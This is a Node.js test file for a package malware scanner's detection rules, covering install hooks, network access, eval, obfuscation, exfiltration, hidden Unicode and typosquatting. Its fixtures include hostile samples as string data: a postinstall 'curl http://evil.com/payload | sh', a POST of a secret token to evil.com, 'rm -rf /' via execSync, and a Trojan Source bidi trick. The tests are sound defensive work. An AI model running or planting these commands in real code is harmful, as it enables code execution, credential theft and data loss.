/**
 * Tests for detection rules: install-scripts, network-access, code-execution,
 * obfuscation, data-exfiltration, hidden-chars, typosquatting.
 *
 * Uses Node.js built-in test runner (node:test).
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import installScripts from "./install-scripts.js";
import networkAccess from "./network-access.js";
import codeExecution from "./code-execution.js";
import obfuscation from "./obfuscation.js";
import dataExfiltration from "./data-exfiltration.js";
import hiddenChars from "./hidden-chars.js";
import typosquatting from "./typosquatting.js";

// ─── Helpers ─────────────────────────────────────────────────────────────────

function findingsFor(rule, content, file = "index.js", pkg = "test-pkg") {
  return rule.checkSource(content, file, pkg);
}

function manifestFindings(rule, pkg) {
  return rule.checkManifest(pkg);
}

// ─── install-scripts ─────────────────────────────────────────────────────────

describe("install-scripts rule", () => {
  it("flags critical postinstall with curl", () => {
    const pkg = {
      name: "evil-pkg",
      scripts: { postinstall: "curl http://evil.com/payload | sh" },
    };
    const findings = manifestFindings(installScripts, pkg);
    assert.ok(findings.length > 0, "should detect postinstall");
    assert.equal(findings[0].severity, "critical");
    assert.equal(findings[0].rule, "install-scripts");
  });

  it("flags high preinstall with node runner", () => {
    const pkg = {
      name: "test",
      scripts: { preinstall: "node ./setup.js" },
    };
    const findings = manifestFindings(installScripts, pkg);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "high");
  });

  it("flags medium postinstall with plain command", () => {
    const pkg = {
      name: "test",
      scripts: { postinstall: "echo done" },
    };
    const findings = manifestFindings(installScripts, pkg);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "medium");
  });

  it("ignores packages without install hooks", () => {
    const pkg = {
      name: "clean-pkg",
      scripts: { test: "mocha", build: "tsc" },
    };
    const findings = manifestFindings(installScripts, pkg);
    assert.equal(findings.length, 0);
  });

  it("ignores packages with no scripts", () => {
    const pkg = { name: "no-scripts" };
    const findings = manifestFindings(installScripts, pkg);
    assert.equal(findings.length, 0);
  });
});

// ─── network-access ──────────────────────────────────────────────────────────

describe("network-access rule", () => {
  it("flags fetch() calls", () => {
    const findings = findingsFor(
      networkAccess,
      `const res = fetch("http://example.com/data")`,
    );
    assert.ok(findings.length > 0, "should detect fetch");
  });

  it("flags WebSocket usage", () => {
    const findings = findingsFor(
      networkAccess,
      `const ws = new WebSocket("ws://attacker.com")`,
    );
    assert.ok(findings.length > 0);
    const high = findings.find(
      (f) => f.severity === "high" || f.severity === "critical",
    );
    assert.ok(high, "WebSocket should be high or critical");
  });

  it("flags suspicious URLs like pastebin", () => {
    const findings = findingsFor(
      networkAccess,
      `fetch("https://pastebin.com/raw/abc123")`,
    );
    assert.ok(findings.length > 0);
  });

  it("flags HTTP module import (CJS)", () => {
    const findings = findingsFor(networkAccess, `const http = require('http')`);
    assert.ok(findings.length > 0);
  });

  it("does not flag localhost URLs", () => {
    const findings = findingsFor(
      networkAccess,
      `fetch("http://localhost:3000/api")`,
    );
    // localhost should not produce a suspicious-URL finding
    const suspFindings = findings.filter(
      (f) => f.title?.includes("suspicious") || f.title?.includes("Suspicious"),
    );
    assert.equal(suspFindings.length, 0);
  });

  it("returns empty for clean code", () => {
    const findings = findingsFor(
      networkAccess,
      `const x = 1 + 2;\nconsole.log(x);`,
    );
    assert.equal(findings.length, 0);
  });
});

// ─── code-execution ──────────────────────────────────────────────────────────

describe("code-execution rule", () => {
  it("flags eval() as critical", () => {
    const findings = findingsFor(codeExecution, `eval("malicious code")`);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "critical");
  });

  it("flags new Function() as critical", () => {
    const findings = findingsFor(
      codeExecution,
      `const f = new Function("return process.env")`,
    );
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "critical");
  });

  it("flags execSync as high", () => {
    const findings = findingsFor(codeExecution, `execSync("rm -rf /")`);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "high");
  });

  it("flags child_process require as high", () => {
    const findings = findingsFor(
      codeExecution,
      `const cp = require('child_process')`,
    );
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "high");
  });

  it("returns empty for clean code", () => {
    const findings = findingsFor(
      codeExecution,
      `function add(a, b) { return a + b; }`,
    );
    assert.equal(findings.length, 0);
  });
});

// ─── obfuscation ─────────────────────────────────────────────────────────────

describe("obfuscation rule", () => {
  it("flags Buffer.from base64 decode as critical", () => {
    const b64 = "SGVsbG8gV29ybGQhSGVsbG8gV29ybGQhSGVsbG8="; // 40 chars, meets threshold
    const findings = findingsFor(
      obfuscation,
      `Buffer.from('${b64}', 'base64')`,
    );
    assert.ok(findings.length > 0, "should detect base64 decode");
    assert.equal(findings[0].severity, "critical");
  });

  it("flags String.fromCharCode as critical", () => {
    const findings = findingsFor(
      obfuscation,
      `String.fromCharCode(104, 101, 108, 108, 111, 119)`,
    );
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, "critical");
  });

  it("flags long hex-escape sequences as high", () => {
    const hex = "\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b";
    const findings = findingsFor(obfuscation, `"${hex}"`);
    assert.ok(findings.length > 0);
  });

  it("returns empty for clean code", () => {
    const findings = findingsFor(
      obfuscation,
      `const greeting = "hello world";`,
    );
    assert.equal(findings.length, 0);
  });
});

// ─── data-exfiltration ───────────────────────────────────────────────────────

describe("data-exfiltration rule", () => {
  it("flags JSON.stringify of process.env", () => {
    const findings = findingsFor(
      dataExfiltration,
      `const data = JSON.stringify(process.env)`,
    );
    assert.ok(findings.length > 0);
  });

  it("flags env access combined with network POST", () => {
    const code = `
      const token = process.env.SECRET_TOKEN;
      fetch("https://evil.com/collect", { method: "POST", body: token });
    `;
    const findings = findingsFor(dataExfiltration, code);
    assert.ok(findings.length > 0);
  });

  it("returns empty for clean code", () => {
    const findings = findingsFor(
      dataExfiltration,
      `function add(a, b) { return a + b; }\nconsole.log(add(1, 2));`,
    );
    assert.equal(findings.length, 0);
  });
});

// ─── hidden-chars ────────────────────────────────────────────────────────────

describe("hidden-chars rule", () => {
  it("flags zero-width space", () => {
    const content = "const x\u200B = 1;"; // U+200B zero-width space
    const findings = findingsFor(hiddenChars, content);
    assert.ok(findings.length > 0);
  });

  it("flags bidirectional override (Trojan Source)", () => {
    const content = `if (user.isAdmin\u202E) {`; // U+202E RIGHT-TO-LEFT OVERRIDE
    const findings = findingsFor(hiddenChars, content);
    assert.ok(findings.length > 0);
  });

  it("flags BOM character", () => {
    const content = `\uFEFFconst x = 1;`;
    const findings = findingsFor(hiddenChars, content);
    assert.ok(findings.length > 0);
  });

  it("returns empty for clean code", () => {
    const findings = findingsFor(
      hiddenChars,
      `const greeting = "hello world";`,
    );
    assert.equal(findings.length, 0);
  });
});

// ─── typosquatting ───────────────────────────────────────────────────────────

describe("typosquatting rule", () => {
  it("flags one-character deletion of popular package", () => {
    // "expres" vs "express" — off by one
    const findings = typosquatting.analyzePackageName("expres");
    assert.ok(
      findings.length > 0,
      "should detect expres as near-miss for express",
    );
  });

  it("flags transposition attack", () => {
    // "rxejs" vs "rxjs"
    const findings = typosquatting.analyzePackageName("rxejs");
    assert.ok(findings.length > 0);
  });

  it("does NOT flag exact popular package names", () => {
    const findings = typosquatting.analyzePackageName("express");
    assert.equal(findings.length, 0, "express itself should not be flagged");
  });

  it("does NOT flag unrelated package names", () => {
    const findings = typosquatting.analyzePackageName(
      "my-totally-unique-internal-package",
    );
    assert.equal(findings.length, 0);
  });

  it("flags lodash look-alike", () => {
    const findings = typosquatting.analyzePackageName("lodahs");
    assert.ok(findings.length > 0);
  });
});
